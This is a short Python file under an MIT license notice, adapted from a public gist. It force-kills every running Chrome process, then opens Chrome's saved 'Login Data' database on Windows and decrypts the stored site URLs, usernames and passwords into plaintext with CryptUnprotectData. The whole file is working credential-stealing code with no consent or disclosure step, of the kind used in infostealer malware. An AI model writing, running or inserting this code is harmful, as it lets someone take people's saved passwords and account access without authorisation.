#The MIT License (MIT)
 
# Copyright (c) 2012 Jordan Wright <jordan-wright.github.io>
 
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
 
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.

# Original file can be found here: https://gist.github.com/jordan-wright/5770442#file-chrome_extract-py

from os import getenv
import sqlite3
import win32crypt
import psutil

def killChrome():
    PROCNAME = "chrome.exe"

    for proc in psutil.process_iter():
        try:
            if proc.name() == PROCNAME:
                proc.kill()
        except psutil.AccessDenied:
            pass


def getChromePasswords():
    killChrome()

    conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
    sql = conn.cursor()
    sql.execute('SELECT action_url, username_value, password_value FROM logins')
    passwords = []
    for result in sql.fetchall():
        password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
        if password: passwords.append(result[0] + " - " + result[1] + " - " + password)

    return passwords